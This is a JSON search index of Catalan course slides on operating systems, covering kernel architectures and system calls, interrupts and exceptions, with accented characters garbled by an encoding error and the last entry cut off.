[
  {
    "objectID": "slides/02-kernel.html#qu√®-√©s-el-nucli-dun-sistema-operatiu",
    "href": "slides/02-kernel.html#qu√®-√©s-el-nucli-dun-sistema-operatiu",
    "title": "Kernel de Linux",
    "section": "Qu√® √©s el nucli d‚Äôun sistema operatiu?",
    "text": "Qu√® √©s el nucli d‚Äôun sistema operatiu?\nEl nucli del SO √©s la capa m√©s cr√≠tica i cont√© les rutines de gesti√≥ del sistema relacionades amb els recursos f√≠sic. Es troba sempre carregat a la Mem√≤ria.\nFuncionalitats del nucli\n\nEl nucli t√© la capacitat d‚Äôassignar i desassignar la CPU als usuaris i processos per evitar que acaparin el recurs de forma ininterrompuda.\nEl nucli evita que els usuaris i processos accedeixin a dades d‚Äôaltres usuaris.\nEl nucli evita els usuaris modif√≠quin el codi i les dades del nucli.\nEl nucli evita que els usuaris realitzin E/S il¬∑legals.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#qu√©-√©s-la-dualitat",
    "href": "slides/02-kernel.html#qu√©-√©s-la-dualitat",
    "title": "Kernel de Linux",
    "section": "Qu√© √©s la dualitat?",
    "text": "Qu√© √©s la dualitat?\n\n\nMode kernel\n\nEl codi que s‚Äôexecuta en aquest mode t√© acc√©s a qualsevol adre√ßa de Mem√≤ria i a tots els recursos hardware.\nSi un programa falla en aquest mode, tot el sistema quedar√† aturat.\n\nMode usuari\n\nEl codi no t√© acc√©s directe a Mem√≤ria ni als recursos hardware.\nSi un programa falla en aquest mode, √∫nicament atura el programa i no el sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#repte-separaci√≥-de-responsabilitats",
    "href": "slides/02-kernel.html#repte-separaci√≥-de-responsabilitats",
    "title": "Kernel de Linux",
    "section": "Repte: Separaci√≥ de responsabilitats",
    "text": "Repte: Separaci√≥ de responsabilitats\n\nQuina √©s la millor manera d‚Äôorganitzar/separar totes les parts del sistema operatiu?\n\n\nCom organitzem les parts?\nDefinici√≥ de pol√≠tiques: Quines seran les accions a realitzar.\nCom cooperen les parts?\nMecanismes: Com es duran a terme aquestes accions.\n\n\nClassificaci√≥ (Estructura Interna)\n\nMonol√≠tics\nCapes\nMicro-kernel\nH√≠brids\nHypervisors",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-simple",
    "href": "slides/02-kernel.html#estructura-simple",
    "title": "Kernel de Linux",
    "section": "Estructura simple",
    "text": "Estructura simple\n\n\nCaracter√≠stiques\n\nEstructura no ben definida.\nEl SO √©s un conjunt de procediments que es poden cridar sense cap limitaci√≥.\nSon sistemes complexos; dif√≠cil d‚Äôimplementar i de depurar.\nNo tenen mode dual.\nExemple: MS-DOS\n\n\n\n\n\n\n\nEls sistemes operatius com MS-DOS o Unix (original) no tenien estructures ben definides.\nNo hi havia cap mode d‚Äôexecuci√≥ de la CPU (usuari i nucli), de manera que els errors en les aplicacions podrien provocar un bloqueig de tot el sistema.\nQuan es va escriure DOS originalment, els seus desenvolupadors no tenien ni idea de quant de gran i important esdevindria. Va ser escrit per uns quants programadors en un temps relativament curt, sense el benefici de les t√®cniques modernes d‚Äôenginyeria de programari, i despr√©s va anar creixent amb el pas del temps fins a superar les seves expectatives originals. No divideix el sistema en subsistemes i no distingeix entre modes d‚Äôusuari i nucli, cosa que permet a tots els programes accedir directament al maquinari subjacent.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-monol√≠tica",
    "href": "slides/02-kernel.html#estructura-monol√≠tica",
    "title": "Kernel de Linux",
    "section": "Estructura Monol√≠tica",
    "text": "Estructura Monol√≠tica\n\n\nEls serveis d‚Äôusuari i serveis del kernel s‚Äôimplementen sota el mateix espai d‚Äôadreces.\n\n\n\n\n\nüëç Les funcionalitats (serveis) s‚Äôinvoquen amb crides al sistema.\nüëç Els controladors de dispositius es carreguen al nucli i passen a formar part del nucli.\nüëé Dif√≠cil d‚Äôentendre, modificar i mantenir.\nüëé Poc fiable (sense a√Øllament entre els m√≤duls del sistema)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-per-capes",
    "href": "slides/02-kernel.html#estructura-per-capes",
    "title": "Kernel de Linux",
    "section": "Estructura per capes",
    "text": "Estructura per capes\n\n\n\n\n\nüëç Independ√®ncia entre les capes.\nüëç Permet descriure el SO de forma clara.\nüëç Simplicitat en la construcci√≥ i depuraci√≥.\nüëé Rendiment.\nüëé √âs dif√≠cil definir les capes a causa de les limitacions per comunicar-se.\n\n\n\nUn exemple √©s UNIX, aquest sistema operatiu, creat per Dennis Ritchie i Ken Thompson als anys 70, va adoptar una arquitectura en capes m√©s simple que Multics. Aquestes capes s√≥n: Hardware, Kernel, Shell i Aplicacions. Un exemple √©s: NetBSD.\nPermet que cada anell tingui un conjunt de funcions i responsabilitats clarament definides, i que cada anell pugui comunicar-se amb els anells adja√ßents.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-microkernel",
    "href": "slides/02-kernel.html#estructura-microkernel",
    "title": "Kernel de Linux",
    "section": "Estructura Microkernel",
    "text": "Estructura Microkernel\n\n\n\nEls serveis d‚Äôusuari i serveis del kernel s‚Äôimplementi en diferents espais d‚Äôadreces.\nComunicaci√≥ entre els m√≤duls utilitza el pas de missatges.\nüëç El kernel t√© una mida m√©s redu√Øda.\nüëç Portable, segur, fiable i extensible.\nüëé Reducci√≥ de la velocitat d‚Äôexecuci√≥ i del rendiment.\n\n\n\n\n\n\n\nEl sistema operatiu MacOS, desenvolupat per Apple, va aprofitar l‚Äôestabilitat i seguretat del nucli Mach com a base per al seu sistema operatiu. En aquest sistema, serveis com la gesti√≥ de mem√≤ria, la gesti√≥ de fitxers i la xarxa es van traslladar fora del nucli, a servidors externs, millorant la estabilitat, fiabilitat i modularitat del sistema.\nSistemes en temps real com QNX, o dispotius encastats poden utilitzar aquesta arquitectura.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#microkernel-vs-monol√≠tic",
    "href": "slides/02-kernel.html#microkernel-vs-monol√≠tic",
    "title": "Kernel de Linux",
    "section": "Microkernel vs Monol√≠tic",
    "text": "Microkernel vs Monol√≠tic\n\n\n\n\nEl microkernel √©s m√©s lent per√≤ m√©s segur i fiable que el nucli monol√≠tic. El nucli monol√≠tic √©s r√†pid per√≤ menys segur, ja que qualsevol fallada del servei pot causar un bloqueig del sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#microkernel-vs-monol√≠tic-vs-h√≠brids",
    "href": "slides/02-kernel.html#microkernel-vs-monol√≠tic-vs-h√≠brids",
    "title": "Kernel de Linux",
    "section": "Microkernel vs Monol√≠tic vs H√≠brids",
    "text": "Microkernel vs Monol√≠tic vs H√≠brids",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#opini√≥-sobre-els-h√≠brids",
    "href": "slides/02-kernel.html#opini√≥-sobre-els-h√≠brids",
    "title": "Kernel de Linux",
    "section": "Opini√≥ sobre els h√≠brids",
    "text": "Opini√≥ sobre els h√≠brids\nMolts experts en sistemes operatius consideren que el terme h√≠brid √©s un terme de m√†rqueting m√©s que una categoria t√®cnica clara. Aquest terme s‚Äôutilitza sovint per descriure sistemes operatius que combinen elements de nuclis monol√≠tics i microkernel, per√≤ la seva definici√≥ exacta pot variar segons l‚Äô√∫s i la interpretaci√≥.\n\n‚ÄúAs to the whole ‚Äòhybrid kernel‚Äô thing - it‚Äôs just marketing. It‚Äôs ‚Äòoh, those microkernels had good PR, how can we try to get good PR for our working kernel? Oh, I know, let‚Äôs use a cool name and try to imply that it has all the PR advantages that that other system has‚Äô - Linus Torvalds",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#kernel-modular",
    "href": "slides/02-kernel.html#kernel-modular",
    "title": "Kernel de Linux",
    "section": "Kernel Modular",
    "text": "Kernel Modular\n\nEl serveis (core) estan integrats al kernel, la resta es poden carregar i descarregar de forma din√†mica.\n\n\nNo cal reiniciar per afegir nous m√≤duls.\nNo cal implementar mecanismes de pas de missatges com en els microkernels.\nQualsevol m√≤dul pot comunicar-se amb qualsevol altre.\n\n\n\n\n\nEls sistemes operatius modulars com la majoria de sistemes operatius monol√≠tics moderns com Linux, BSD, poden carregar (i descarregar) din√†micament m√≤duls executables en temps d‚Äôexecuci√≥.\nAquesta modularitat del sistema operatiu √©s a nivell binari (imatge) i no a nivell d‚Äôarquitectura.\nPr√†cticament, carregar m√≤duls din√†micament √©s simplement una manera m√©s flexible de manejar la imatge del sistema operatiu en temps d‚Äôexecuci√≥, en lloc de reiniciar-lo amb una imatge diferent del sistema operatiu.\nEls m√≤duls permeten ampliar f√†cilment les capacitats dels sistemes operatius segons sigui necessari.\nEls m√≤duls que es poden carregar din√†micament comporten una petita sobrec√†rrega en comparaci√≥ amb la incorporaci√≥ del m√≤dul a la imatge del sistema operatiu.\nTanmateix, en alguns casos, carregar m√≤duls din√†micament (segons calgui) ajuda a mantenir la quantitat de codi que s‚Äôexecuta a l‚Äôespai del nucli al m√≠nim; per exemple, per minimitzar la petjada del sistema operatiu per a dispositius incrustats o aquells amb recursos de maquinari limitats. √âs a dir, no cal que un m√≤dul descarregat s‚Äôemmagatzemi en mem√≤ria d‚Äôacc√©s aleatori esc√†s.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#monol√≠tic-i-modular",
    "href": "slides/02-kernel.html#monol√≠tic-i-modular",
    "title": "Kernel de Linux",
    "section": "Monol√≠tic i Modular",
    "text": "Monol√≠tic i Modular\n\nEls kernels monol√≠tics poden ser modulars.\nEls m√≤duls es carreguen i descarreguen din√†micament en temps d‚Äôexecuci√≥.\nEls components es poden activar o desactivar en temps de compilaci√≥.\nEl kernel s‚Äôorganitza en subsistemes l√≤gics independents.\nInterf√≠cies estrictes per√≤ amb baix cost en rendiment: macros, funcions en l√≠nia, punters a funcions.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#exemple-linux",
    "href": "slides/02-kernel.html#exemple-linux",
    "title": "Kernel de Linux",
    "section": "Exemple: Linux",
    "text": "Exemple: Linux\n\n\n\nEl nucli Linux √©s un dels projectes de codi obert m√©s grans del m√≥n, amb milers de desenvolupadors que aporten codi i milions de l√≠nies de codi canviats per a cada versi√≥.\n\n\nArquitectura Monol√≠tica h√≠brida basada en m√≤duls.\n\nEnlla√ßat din√†mic.\nM√≤duls apilables.\n\nDisseny orientat a objectes.\nSuport per a m√∫ltiples fils d‚Äôexecuci√≥.\nSuport per processament m√∫ltiple sim√®tric.\nAbstracci√≥ hardware.\n\n\n\n\n\n\n\nEs distribueix sota la llic√®ncia GPLv2, que simplement esmenta, requereix que qualsevol modificaci√≥ del nucli feta amb el programari que s‚Äôenvia al client s‚Äôhagi de posar a la seva disposici√≥ (els clients), tot i que a la pr√†ctica la majoria de les empreses posen el codi font a disposici√≥ del p√∫blic.\nPer tal d‚Äôescalar el proc√©s de desenvolupament, Linux utilitza un model de manteniment jer√†rquic:\nLinus Torvalds √©s el mantenidor del nucli Linux i fa merge dels pull requests de la comunitat.\nLa comunitat t√© un o m√©s mantenidors que accepten patches de desenvolupadors, mantenint el seu propi arbre git.\n\nLinux Torvalds: git\nDavid Miller (treball en xarxa): git",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#hypervisors",
    "href": "slides/02-kernel.html#hypervisors",
    "title": "Kernel de Linux",
    "section": "Hypervisors",
    "text": "Hypervisors\n\nCapa fina sobre el maquinari\nSistemes host dins m√†quines virtuals\nNormalment requereixen caracter√≠stiques de maquinari (p.e. Intel VT-x)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#hypervisors-1",
    "href": "slides/02-kernel.html#hypervisors-1",
    "title": "Kernel de Linux",
    "section": "Hypervisors",
    "text": "Hypervisors\n\n\n\nKVM √©s un m√≤dul del kernel Linux que permet la virtualitzaci√≥ a trav√©s d‚Äôun sistema host.\nXEN √©s un hypervisor de codi obert que permet la virtualitzaci√≥ directa del maquinari.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#exokernels",
    "href": "slides/02-kernel.html#exokernels",
    "title": "Kernel de Linux",
    "section": "Exokernels",
    "text": "Exokernels\n\nCada m√†quina virtual disposa d‚Äôun exokernel que exporta directament els recursos f√≠sics.\n\n\nNo implementa abstraccions altes (fitxers, sockets, processos), sin√≥ que ofereix primitives de baix nivell (p.¬†ex. blocs de disc, p√†gines de mem√≤ria, l√≠nies de CPU).\nNom√©s valida i arbitra l‚Äô√∫s dels recursos, delegant la seva gesti√≥ a biblioteques d‚Äôusuari.\nMou la multiprogramaci√≥ a l‚Äôespai d‚Äôusuari, com la planificaci√≥, la gesti√≥ de mem√≤ria i la comunicaci√≥ entre processos (IPC).\nü§è Els exokernels s√≥n tan petits que poden ser incorporats dins aplicacions espec√≠fiques (p.¬†ex. control de tr√†nsit urb√†).\n‚ú® minimitza l‚Äôoverhead i dona flexibilitat en la gesti√≥ de recursos.\n\n\nüëâ No es traslladen instruccions de mode kernel a mode usuari, sin√≥ la l√≤gica de gesti√≥ de recursos.\n\n\nImaginem que particionem una m√†quina en diferents m√†quines virtuals amb un subconjunt de recursos. Cada m√†quina virtual t√© un exokernel que li permet accedir directament als recursos de la m√†quina f√≠sica. La idea √©s reduir el overhead del sistema separant la multiprogramaci√≥ de les funcions del sistema operatiu en l‚Äôespai usuari.\nEn aquest cas no estem movent instruccions de mode kernel a mode usuari, sin√≥ que estem movent la gesti√≥ de recursos del sistema operatiu a l‚Äôespai d‚Äôusuari. De fet, els exokernels s√≥n tan petits que poden ser incrustats en aplicacions espec√≠fiques. Per exemple, un exokernel podria ser incrustat en una aplicaci√≥ de control de tr√†nsit per coordinar els sem√†fors d‚Äôuna ciutat.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#unikernels",
    "href": "slides/02-kernel.html#unikernels",
    "title": "Kernel de Linux",
    "section": "Unikernels",
    "text": "Unikernels\n\nEls unikernels empaqueten aplicaci√≥ + m√≠nim sistema operatiu en una √∫nica imatge executable sobre un hipervisor o hardware.\n\n\nNom√©s s‚Äôinclouen les llibreries i serveis estrictament necessaris per l‚Äôaplicaci√≥.\nExecuci√≥ directa: corren sobre un hipervisor o hardware, sense cap OS d‚Äôhost per sota.\nEfici√®ncia: imatges extremadament petites, r√†pides d‚Äôarrencar.\nInspiraci√≥:\n\nDels contenidors, per√≤ sense dependre d‚Äôun kernel complet subjacent.\nDels exokernels, per√≤ aqu√≠ les primitives exposades no s√≥n per al maquinari, sin√≥ per a les necessitats espec√≠fiques de l‚Äôaplicaci√≥.\n\nS‚Äôutilitzen en IoT, serveis cloud lleugers, entorns on importen temps d‚Äôarrencada i seguretat.\n\n\nEl codi de l‚Äôaplicaci√≥ i el kernel formen una sola unitat optimitzada.\n\n\nEls unikernels s√≥n una forma de sistema operatiu que empaqueta tot el codi necessari per a una aplicaci√≥ en un sol paquet. Aquest paquet s‚Äôexecuta directament sobre una m√†quina virtual o un hipervisor, sense cap sistema operatiu subministrat. Aix√≤ permet als unikernels ser molt petits i molt eficients, ja que no hi ha cap codi innecessari.\nS‚Äôinspiren en els contenidors, per√≤ en lloc d‚Äôexecutar-se en un sistema operatiu complet, s‚Äôexecuten directament sobre el hardware. Aix√≤ els fa molt m√©s petits i molt m√©s eficients que els contenidors, ja que no hi ha cap sistema operatiu subministrat.\nS‚Äôinspiren en els exokernels, per√≤ en lloc de proporcionar un conjunt de primitives de baix nivell per accedir directament als recursos de la m√†quina, proporcionen un conjunt de primitives de baix nivell per accedir directament als recursos de l‚Äôaplicaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/02-kernel.html#aix√≤-√©s-tot-per-avui",
    "title": "Kernel de Linux",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\n\nEls monol√≠tics ofereixen velocitat per√≤ fragilitat.\nEls microkernels aposten per modularitat i seguretat a costa de lat√®ncia.\nEls modulars permeten cr√©ixer sense reescriure tot el nucli.\nEls exokernels lliuren el control directe a l‚Äôaplicaci√≥ per m√†xima efici√®ncia.\nEls hipervisors faciliten la conviv√®ncia d‚Äôecosistemes sencers sobre un mateix hardware.\nEls unikernels empaqueten aplicaci√≥ i SO per a desplegaments ultralleugers i segurs.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#que-s√≥n-les-crides-a-sistema",
    "href": "slides/02-syscalls.html#que-s√≥n-les-crides-a-sistema",
    "title": "Crides a sistema",
    "section": "Que s√≥n les crides a sistema?",
    "text": "Que s√≥n les crides a sistema?\nLes crides a sistema s√≥n interf√≠cies que permeten a un programa en mode usuari sol¬∑licitar serveis al nucli del sistema operatiu de manera segura i controlada.\n\n\n\n\n\n\n\n\nSistema operatiu\nN¬∫ aproximat de syscalls\nNotes\n\n\n\n\nLinux x86_64\n~300\nVariaci√≥ segons kernel\n\n\nFreeBSD\n~500\nInclou syscalls BSD hist√≤rics\n\n\nWindows NT\n~2000\nCrides natives Nt*; moltes encapsulades en DLL\n\n\n\nNormalment s‚Äôaccedeix a les syscalls a trav√©s de llibreries de sistema, que encapsulen i abstrauen les crides:\n\nUnix/Linux: libc (stdio.h, stdlib.h, sys/types.h, sys/shm.h, ‚Ä¶)\nWindows: API de Windows (kernel32.dll, ntdll.dll, ‚Ä¶)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#principals-crides-a-sistema-i",
    "href": "slides/02-syscalls.html#principals-crides-a-sistema-i",
    "title": "Crides a sistema",
    "section": "Principals crides a sistema? (I)",
    "text": "Principals crides a sistema? (I)\n\n\n\n\n\n\n\n\n\nCategoria\nWindows (API / Syscall)\nUnix/Linux (Syscall)\nDescripci√≥\n\n\n\n\nControl de processos\nCreateProcess() / NtCreateProcess\nfork() / clone()\nfork() crea un proc√©s fill; Windows encapsula la syscall amb CreateProcess.\n\n\n\nExitProcess() / NtTerminateProcess\nexit()\nTanca el proc√©s.\n\n\n\nWaitForSingleObject() / NtWaitForSingleObject\nwait() / waitpid()\nSincronitzaci√≥ de processos.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#principals-crides-a-sistema-ii",
    "href": "slides/02-syscalls.html#principals-crides-a-sistema-ii",
    "title": "Crides a sistema",
    "section": "Principals crides a sistema? (II)",
    "text": "Principals crides a sistema? (II)\n\n\n\n\n\n\n\n\n\nCategoria\nWindows (API / Syscall)\nUnix/Linux (Syscall)\nDescripci√≥\n\n\n\n\nInformaci√≥ i temporitzaci√≥\nGetCurrentProcessId() / NtQueryInformationProcess\ngetpid()\nRetorna PID.\n\n\n\nSetTimer() / NtSetTimer\nalarm() / nanosleep()\nTemporitzaci√≥ i delays.\n\n\n\nSleep() / NtDelayExecution\nsleep() / nanosleep()\nPausa el proc√©s; variants m√©s precises disponibles.\n\n\nComunicaci√≥ entre processos (IPC)\nCreatePipe() / NtCreateNamedPipeFile\npipe()\nPipes an√≤nims; Windows tamb√© t√© Named Pipes, mailslots, shared memory.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#principals-crides-a-sistema",
    "href": "slides/02-syscalls.html#principals-crides-a-sistema",
    "title": "Crides a sistema",
    "section": "Principals crides a sistema?",
    "text": "Principals crides a sistema?\n\n\n\n\n\n\n\n\n\nCategoria\nWindows (API / Syscall)\nUnix/Linux (Syscall)\nDescripci√≥\n\n\n\n\nProtecci√≥ i permisos\nSetFileSecurity() / NtSetSecurityObject\nchmod(), chown()\nWindows usa ACLs complexes; Unix usa permisos Unix tradicionals.\n\n\nManipulaci√≥ de fitxers\nCreateFile() / NtCreateFile\nopen()\nObre un fitxer.\n\n\n\nReadFile() / NtReadFile\nread()\nLlegeix dades.\n\n\n\nWriteFile() / NtWriteFile\nwrite()\nEscriu dades.\n\n\n\nCloseHandle() / NtClose\nclose()\nTanca descriptor o handle.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exemple-amb-la-llibreria-stdio.h",
    "href": "slides/02-syscalls.html#exemple-amb-la-llibreria-stdio.h",
    "title": "Crides a sistema",
    "section": "Exemple amb la llibreria (stdio.h)",
    "text": "Exemple amb la llibreria (stdio.h)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#protecci√≥-de-la-cpu",
    "href": "slides/02-syscalls.html#protecci√≥-de-la-cpu",
    "title": "Crides a sistema",
    "section": "Protecci√≥ de la CPU",
    "text": "Protecci√≥ de la CPU\n\n\n\nLa CPU permet m√∫ltiples nivells de seguretat, anomenats rings (o anells).\nCada ring (comen√ßant pel ring 0) restringeix l‚Äôacc√©s a certes instruccions.\nEl kernel utilitza el ring 0 (anell de fes el que vulguis) com a Kernel Space i el ring 3 (l‚Äôanell on tens m√©s limitacions) com a UserSpace (on s‚Äôexecuten els teus programes).\n\n\n\n\n\nDegut a l‚Äôacc√©s restringit a la mem√≤ria i als ports d‚ÄôE/S en el Ring 3, l‚Äôespai d‚Äôusuari no pot fer gaireb√© res per al m√≥n exterior sense cridar al kernel. No pot obrir fitxers, enviar paquets de xarxa, imprimir a la pantalla o assignar mem√≤ria.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#qu√®-√©s-una-crida-al-sistema-ii",
    "href": "slides/02-syscalls.html#qu√®-√©s-una-crida-al-sistema-ii",
    "title": "Crides a sistema",
    "section": "Qu√® √©s una crida al sistema? (II)",
    "text": "Qu√® √©s una crida al sistema? (II)\n\nEls programes en mode usuari necessiten accedir a recursos gestionats pel kernel (fitxers, dispositius, mem√≤ria, etc.).\nEl kernel s‚Äôexecuta en mode privilegiat (anell 0) amb acc√©s complet al maquinari.\nEls programes en mode usuari s‚Äôexecuten en mode restringit (anell 3) amb acc√©s limitat.\nLes crides al sistema s√≥n la interf√≠cie que permet als programes en mode usuari sol¬∑licitar serveis al kernel de manera segura.\nNo tenim cap instrucci√≥ que permeti canviar directament del mode usuari al mode kernel.\n\n\nCom pot un proc√©s en mode usuari notificar al kernel que necessita fer alguna cosa? Si no tenim cap instrucci√≥ que ho permeti?",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#com-funciona-el-procesador",
    "href": "slides/02-syscalls.html#com-funciona-el-procesador",
    "title": "Crides a sistema",
    "section": "Com funciona el procesador?",
    "text": "Com funciona el procesador?\nEl processador executa instruccions seguint el cicle:\n\nHow Do CPUs Run Programs Using the Fetch, Decode, Execute Cycle?  Fetch ‚Üí Decode ‚Üí Execute ‚Üí Memory ‚Üí Writeback.\n\nPot processar m√∫ltiples instruccions en paral¬∑lel gr√†cies a pipelining i execuci√≥ fora d‚Äôordre.\n\nEl codi usuari no pot accedir directament a dispositius o mem√≤ria reservada.\nEls dispositius envien interrupcions per indicar esdeveniments (ex.: teclat, disc, xarxa).\nEl kernel intercepta aquestes interrupcions i pot invocar handlers, que poden traduir-se en crides a sistema per als processos usuari.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#qu√®-√©s-una-interrupci√≥",
    "href": "slides/02-syscalls.html#qu√®-√©s-una-interrupci√≥",
    "title": "Crides a sistema",
    "section": "Qu√® √©s una interrupci√≥?",
    "text": "Qu√® √©s una interrupci√≥?\nLes interrupcions s√≥n senyals as√≠ncrons enviats al processador per indicar esdeveniments que requereixen atenci√≥ immediata. Poden ser de hardware (teclat, disc, temporitzador) o de software (excepcions, traps, syscalls).\n\nGesti√≥ d‚Äôuna interrupci√≥\n\nGuardar el context del proc√©s actual (registres, PC, flags).\nCanviar a mode kernel.\nDeterminar la causa de la interrupci√≥ (vector d‚Äôinterrupcions).\nSaltar a la Interrupt Service Routine (RTI/ISR).\nExecutar ISR per atendre l‚Äôesdeveniment.\n6.Restaurar el context del proc√©s.\nTornar a mode usuari.\n\n\n\nLes interrupcions s√≥n priorit√†ries i poden executar-se sobre processos en execuci√≥ per garantir resposta immediata.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#qu√®-√©s-la-taula-dinterrupcions",
    "href": "slides/02-syscalls.html#qu√®-√©s-la-taula-dinterrupcions",
    "title": "Crides a sistema",
    "section": "Qu√® √©s la taula d‚Äôinterrupcions?",
    "text": "Qu√® √©s la taula d‚Äôinterrupcions?\n\nQuan el processador rep una interrupci√≥, ha de saber a quin codi saltar per atendre-la.\nLa Interrupt Descriptor Table (IDT) √©s una estructura del kernel que indica al CPU la adre√ßa de cada ISR.\nSense configurar la IDT, el CPU no sabria quin codi executar en rebre una interrupci√≥.\n\n\nQui configura la IDT?\n\nEl kernel, a l‚Äôinici, inicialitza la IDT i apunta cada entrada a la seva ISR corresponent.\nEl kernel tamb√© gestiona les actualitzacions de la IDT en temps d‚Äôexecuci√≥, si √©s necessari.\n\n\n\nLa IDT es pot veure directament al codi font del kernel Linux: IDT i on s‚Äôinicialitza: IDT init.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#excepcions",
    "href": "slides/02-syscalls.html#excepcions",
    "title": "Crides a sistema",
    "section": "Excepcions",
    "text": "Excepcions\nLes excepcions s√≥n esdeveniments generats pel CPU quan una instrucci√≥ provoca una condici√≥ anormal. El sistema operatiu pot tractar l‚Äôexcepci√≥; si no pot, envia un senyal al proc√©s, que pot usar el gestor per defecte o un gestor espec√≠fic.\n\n\n\n\n\n\n\n\n\nTipus\nQuan s‚Äôinforma\nExemple\nDescripci√≥\n\n\n\n\nFault\nAbans de l‚Äôexecuci√≥\nPage fault\nNormalment es pot corregir; instrucci√≥ reintenta despr√©s del tractament.\n\n\nTrap\nDespr√©s de l‚Äôexecuci√≥\nBreakpoint, syscall\nCondici√≥ detectada despr√©s; sovint informativa o de depuraci√≥.\n\n\nAbort\nIrrecuperable\nParitat de mem√≤ria, kernel panic\nNo es pot continuar; sovint provoca terminaci√≥ del proc√©s o panic del kernel.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exemples-dexcepcions",
    "href": "slides/02-syscalls.html#exemples-dexcepcions",
    "title": "Crides a sistema",
    "section": "Exemples d‚Äôexcepcions",
    "text": "Exemples d‚Äôexcepcions\n\n\n\n\n\n\n\n\nName\nType\nDescripci√≥ curta\n\n\n\n\nDivide-by-zero\nFault\nInstrucci√≥ divideix per zero\n\n\nDebug\nTrap\nDepuraci√≥; despr√©s de la instrucci√≥\n\n\nNon-maskable Interrupt\nInterrupt\nInterrupci√≥ cr√≠tica de hardware\n\n\nBreakpoint\nTrap\nTrap de depuraci√≥ per breakpoint\n\n\nOverflow\nTrap\nL‚Äôoperaci√≥ aritm√®tica sobrepassa capacitat del registre\n\n\nBound Range Exceeded\nFault\nIndex fora de rang en instrucci√≥ BOUND\n\n\nDouble Fault\nAbort\nError cr√≠tic del CPU durant gesti√≥ d‚Äôuna altra excepci√≥\n\n\nPage Fault\nFault\nAcc√©s a p√†gina no resident en mem√≤ria\n\n\n\n\nExcepcions\n\n\nPer a m√©s informaci√≥ podeu consultar el seg√ºent enlla√ß: Excepcions.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#com-accedim-al-kernel",
    "href": "slides/02-syscalls.html#com-accedim-al-kernel",
    "title": "Crides a sistema",
    "section": "Com accedim al Kernel",
    "text": "Com accedim al Kernel\n\n\n\n\nUn trap √©s una interrupci√≥ de software generada deliberadament pel proc√©s usuari per sol¬∑licitar un servei del kernel. La majoria de syscalls s‚Äôimplementen com traps, que canvien a mode kernel i executen la funci√≥ corresponent.",
    "crumbs": [
